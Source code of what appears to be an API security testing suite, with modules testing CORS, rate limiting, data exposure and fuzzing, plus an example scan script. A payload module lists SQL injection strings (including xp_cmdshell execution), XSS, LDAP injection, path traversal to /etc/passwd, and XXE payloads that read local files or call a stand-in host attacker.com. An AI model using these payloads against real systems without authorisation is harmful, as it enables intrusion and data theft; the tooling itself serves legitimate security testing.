# src/modules/cors_tester.py
class CORSTester:
    def __init__(self, client):
        self.client = client
        self.vulnerabilities = []
        
    def run_tests(self, endpoints=None):
        """Test CORS configuration"""
        print("  [+] Testing CORS configuration...")
        
        if endpoints is None:
            endpoints = ['/api/', '/api/users', '/api/data']
            
        origins = [
            'http://evil.com',
            'null',
            'http://localhost:8080',
            'https://attacker.com'
        ]
        
        for endpoint in endpoints:
            for origin in origins:
                headers = {'Origin': origin}
                response = self.client.get(endpoint, headers=headers)
                
                if response['success']:
                    cors_header = response['headers'].get('Access-Control-Allow-Origin')
                    
                    if cors_header == '*' or cors_header == origin:
                        self.vulnerabilities.append({
                            'type': 'Insecure CORS Configuration',
                            'severity': 'High',
                            'endpoint': endpoint,
                            'description': f'CORS allows origin: {origin}',
                            'details': f'Access-Control-Allow-Origin: {cors_header}',
                            'cvss': 7.1
                        })
                        
        return self.vulnerabilities

# src/modules/rate_limit_tester.py
import time
import concurrent.futures

class RateLimitTester:
    def __init__(self, client):
        self.client = client
        self.vulnerabilities = []
        
    def run_tests(self, endpoints=None):
        """Test rate limiting implementation"""
        print("  [+] Testing rate limiting...")
        
        if endpoints is None:
            endpoints = ['/api/login', '/api/password-reset', '/api/register']
            
        for endpoint in endpoints:
            self.test_endpoint_rate_limit(endpoint)
            
        return self.vulnerabilities
    
    def test_endpoint_rate_limit(self, endpoint, requests_count=100):
        """Test if endpoint has proper rate limiting"""
        success_count = 0
        start_time = time.time()
        
        # Send rapid requests
        for i in range(requests_count):
            response = self.client.post(endpoint, json={'test': i})
            if response['success'] and response['status_code'] != 429:
                success_count += 1
                
        elapsed_time = time.time() - start_time
        requests_per_second = success_count / elapsed_time
        
        if success_count > 50:  # More than 50 successful requests
            self.vulnerabilities.append({
                'type': 'Missing Rate Limiting',
                'severity': 'Medium',
                'endpoint': endpoint,
                'description': f'No rate limiting detected. {success_count} requests succeeded in {elapsed_time:.2f}s',
                'requests_per_second': requests_per_second,
                'cvss': 5.3
            })

# src/modules/data_exposure_tester.py
import re
import json

class DataExposureTester:
    def __init__(self, client):
        self.client = client
        self.vulnerabilities = []
        
    def run_tests(self, endpoints=None):
        """Test for sensitive data exposure"""
        print("  [+] Testing for data exposure...")
        
        if endpoints is None:
            endpoints = ['/api/users', '/api/profile', '/api/config']
            
        for endpoint in endpoints:
            self.check_endpoint_exposure(endpoint)
            
        return self.vulnerabilities
    
    def check_endpoint_exposure(self, endpoint):
        """Check endpoint for sensitive data exposure"""
        response = self.client.get(endpoint)
        
        if not response['success']:
            return
            
        body = response.get('body', '')
        headers = response.get('headers', {})
        
        # Check for sensitive patterns
        sensitive_patterns = {
            'SSN': r'\b\d{3}-\d{2}-\d{4}\b',
            'Credit Card': r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',
            'API Key': r'(api[_-]?key|apikey)[\s:=]+[\w-]+',
            'Private Key': r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
            'Password': r'(password|passwd|pwd)[\s:=]+[^\s]+',
            'Database URL': r'(mongodb|postgres|mysql|redis)://[^\s]+',
            'AWS Key': r'AKIA[0-9A-Z]{16}',
            'Email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        }
        
        for pattern_name, pattern in sensitive_patterns.items():
            if re.search(pattern, body, re.IGNORECASE):
                self.vulnerabilities.append({
                    'type': 'Sensitive Data Exposure',
                    'severity': 'High',
                    'endpoint': endpoint,
                    'description': f'{pattern_name} found in response',
                    'cvss': 7.5
                })
        
        # Check for debug information
        debug_indicators = ['stack_trace', 'debug', 'error_details', 'sql_query']
        for indicator in debug_indicators:
            if indicator in body.lower():
                self.vulnerabilities.append({
                    'type': 'Debug Information Disclosure',
                    'severity': 'Medium',
                    'endpoint': endpoint,
                    'description': f'Debug information exposed: {indicator}',
                    'cvss': 5.3
                })
        
        # Check headers
        sensitive_headers = ['X-Powered-By', 'Server', 'X-Debug-Token']
        for header in sensitive_headers:
            if header in headers:
                self.vulnerabilities.append({
                    'type': 'Information Disclosure',
                    'severity': 'Low',
                    'endpoint': endpoint,
                    'description': f'Sensitive header exposed: {header}: {headers[header]}',
                    'cvss': 3.1
                })

# src/modules/fuzzer.py
import random
import string
from faker import Faker

class APIFuzzer:
    def __init__(self, client):
        self.client = client
        self.faker = Faker()
        self.vulnerabilities = []
        
    def run_tests(self, endpoints=None):
        """Run fuzzing tests"""
        print("  [+] Running fuzzer...")
        
        if endpoints is None:
            endpoints = ['/api/users', '/api/search', '/api/data']
            
        for endpoint in endpoints:
            self.fuzz_endpoint(endpoint)
            
        return self.vulnerabilities
    
    def fuzz_endpoint(self, endpoint, iterations=50):
        """Fuzz test an endpoint"""
        for _ in range(iterations):
            # Generate random payloads
            payload = self.generate_payload()
            
            # Test different HTTP methods
            for method in ['GET', 'POST', 'PUT']:
                if method == 'GET':
                    response = self.client.get(endpoint, params=payload)
                else:
                    response = self.client.request(method, endpoint, json=payload)
                
                # Check for errors
                if response['success'] and response['status_code'] >= 500:
                    self.vulnerabilities.append({
                        'type': 'Server Error on Fuzzing',
                        'severity': 'Medium',
                        'endpoint': endpoint,
                        'method': method,
                        'description': f'Server error with payload: {str(payload)[:100]}...',
                        'status_code': response['status_code'],
                        'cvss': 4.3
                    })
    
    def generate_payload(self):
        """Generate random fuzzing payload"""
        payload_types = [
            self.generate_overflow_payload,
            self.generate_special_chars_payload,
            self.generate_nested_payload,
            self.generate_type_confusion_payload,
            self.generate_unicode_payload
        ]
        
        generator = random.choice(payload_types)
        return generator()
    
    def generate_overflow_payload(self):
        """Generate buffer overflow payloads"""
        return {
            'data': 'A' * random.randint(1000, 10000),
            'number': 2**63 - 1,  # Max int64
            'array': ['x'] * 1000
        }
    
    def generate_special_chars_payload(self):
        """Generate special character payloads"""
        special_chars = '!@#$%^&*(){}[]|\\:;"\'<>,.?/~`'
        return {
            'input': ''.join(random.choices(special_chars, k=50)),
            'path': '../' * 10 + 'etc/passwd',
            'null_byte': 'test\x00admin'
        }
    
    def generate_nested_payload(self):
        """Generate deeply nested payloads"""
        nested = {'a': {}}
        current = nested['a']
        for _ in range(100):
            current['b'] = {}
            current = current['b']
        return nested
    
    def generate_type_confusion_payload(self):
        """Generate type confusion payloads"""
        return {
            'string_as_number': '123abc',
            'number_as_string': str(random.randint(1, 1000)),
            'boolean_as_string': 'true',
            'array_as_string': '[1,2,3]',
            'object_as_string': '{"key": "value"}'
        }
    
    def generate_unicode_payload(self):
        """Generate Unicode payloads"""
        return {
            'emoji': '😈🔥💀' * 10,
            'rtl': '\u202e\u202d' + self.faker.text(),
            'zalgo': 'ḩ̷̈́ë̸́ͅl̶̰̽l̴̰̾o̶̤̍',
            'unicode_null': 'test\ufeff\u200bdata'
        }

# src/utils/payloads.py
class PayloadGenerator:
    """Generate various security testing payloads"""
    
    @staticmethod
    def get_sql_injection_payloads():
        return [
            "' OR '1'='1",
            "1' AND '1'='2",
            "' OR '1'='1' --",
            "1 UNION SELECT NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' UNION SELECT database(),NULL--",
            "'; EXEC xp_cmdshell('dir')--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
    
    @staticmethod
    def get_xss_payloads():
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<input onfocus=alert('XSS') autofocus>"
        ]
    
    @staticmethod
    def get_xxe_payloads():
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>'
        ]
    
    @staticmethod
    def get_ldap_injection_payloads():
        return [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&(1=1",
            "admin)(|(1=1",
            "*)(mail=*",
            "*)(|(mail=*",
            ")(cn=*))(|(cn=*"
        ]

# examples/basic_scan.py
from api_security_suite import APISecurityTester

def main():
    # Initialize the security tester
    tester = APISecurityTester(
        base_url="https://api.example.com",
        api_key="your-api-key-here"
    )
    
    # Define endpoints to test
    endpoints = [
        "/api/v1/users",
        "/api/v1/products", 
        "/api/v1/search",
        "/api/v1/login",
        "/api/v1/admin"
    ]
    
    # Run security scan
    print("[*] Starting API Security Scan...")
    results = tester.run_full_scan(endpoints=endpoints)
    
    # Generate HTML report
    print("[*] Generating report...")
    report = tester.generate_report(results, format='html')
    
    # Save report
    with open('security_report.html', 'w') as f:
        f.write(report)
    
    print(f"[*] Found {len(results['vulnerabilities'])} vulnerabilities")
    print("[*] Report saved to security_report.html")

if __name__ == "__main__":
    main()